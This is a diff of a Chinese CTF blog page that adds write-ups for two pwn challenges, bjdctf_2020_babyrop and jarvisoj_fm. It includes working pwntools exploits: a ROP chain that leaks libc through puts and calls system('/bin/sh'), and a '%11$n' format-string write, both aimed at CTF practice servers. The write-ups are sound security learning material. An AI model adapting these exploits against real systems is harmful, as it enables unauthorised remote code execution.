@@ -28,8 +28,13 @@
 <meta property="og:description" content="[HNCTF 2022 WEEK2]ret2csu上一周学了ret2csu，但是没能成功打通，这次来找个简单的题目试一试 看起来简单罢了 ROPgadget发现有pop_rdi 但是尝试了一下，第一段获取write地址的好像不可以() 所以算是半个csu罢">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-02-26_12-12-28.png">
+<meta property="og:image" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-03_23-18-31.png">
+<meta property="og:image" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-03_23-40-26.png">
+<meta property="og:image" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-04_11-52-26.png">
+<meta property="og:image" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-04_11-53-19.png">
+<meta property="og:image" content="http://example.com/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-04_11-53-58.png">
 <meta property="article:published_time" content="2023-02-26T04:08:12.000Z">
-<meta property="article:modified_time" content="2023-03-03T14:33:26.844Z">
+<meta property="article:modified_time" content="2023-03-04T04:23:53.827Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -188,7 +193,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-03 22:33:26" itemprop="dateModified" datetime="2023-03-03T22:33:26+08:00">2023-03-03</time>
+                <time title="Modified: 2023-03-04 12:23:53" itemprop="dateModified" datetime="2023-03-04T12:23:53+08:00">2023-03-04</time>
               </span>
 
           
@@ -232,6 +237,25 @@
 
 <p>得到flag</p>
 <p>这个比ctfwiki易懂<a target="_blank" rel="noopener" href="https://blog.csdn.net/turtlesd/article/details/124440449">(60条消息) pwn中级ROP——ret2csu_见过自讼的博客-CSDN博客</a></p>
+<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><p>首先checksec，依旧是栈不可执行保护<img src="/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-03_23-18-31.png"></p>
+<p>ida反编译，vuln处有溢出点<img src="/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-03_23-40-26.png"></p>
+<p>在那个网站上找不到puts 690，于是试了一下LibcSearcher,结果发现可以用了！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">io=remote(&quot;node4.buuoj.cn&quot;,28077)</span><br><span class="line">#io=process(&quot;./bjdctf_2020_babyrop&quot;)</span><br><span class="line">elf=ELF(&quot;./bjdctf_2020_babyrop&quot;)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line">main_addr=elf.symbols[&quot;main&quot;]</span><br><span class="line">pop_rdi=0x0400733</span><br><span class="line">ret=0x04004c9</span><br><span class="line">payload=b&quot;a&quot;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">puts_addr=u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">libc=LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(&quot;puts&quot;)</span><br><span class="line">sys_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="line">shell_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload=b&quot;a&quot;*0x28+p64(pop_rdi)+p64(shell_addr)+p64(sys_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><p>checksec一下，金丝雀都打开了，害怕</p>
+<p><img src="/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-04_11-52-26.png"></p>
+<p>ida反编译，发现还好，是格式化字符串漏洞</p>
+<p><img src="/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-04_11-53-19.png"></p>
+<p>只要让x&#x3D;4即可</p>
+<p><img src="/2023/02/26/%E7%AC%AC%E4%B8%83%E5%91%A8pwn/Snipaste_2023-03-04_11-53-58.png"></p>
+<p>得到偏移为11</p>
+<p>构造payload</p>
+<p><code>payload=p32(0x0804A02C)+&quot;%11$n&quot;</code></p>
+<p>解释一下，第一段是x的地址，%11$n是定位到偏移为11，写入的数据由前面一段的参数长度决定，p32很明显是四位的，所以直接就是4了</p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r=process(&quot;./fm&quot;)</span><br><span class="line">r=remote(&quot;node4.buuoj.cn&quot;,27825)</span><br><span class="line">payload=p32(0x0804A02C)+b&quot;%11$n&quot;</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -315,7 +339,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-ret2csu"><span class="nav-number">1.</span> <span class="nav-text">[HNCTF 2022 WEEK2]ret2csu</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HNCTF-2022-WEEK2-ret2csu"><span class="nav-number">1.</span> <span class="nav-text">[HNCTF 2022 WEEK2]ret2csu</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-babyrop"><span class="nav-number">2.</span> <span class="nav-text">bjdctf_2020_babyrop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-fm"><span class="nav-number">3.</span> <span class="nav-text">jarvisoj_fm</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -329,7 +353,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
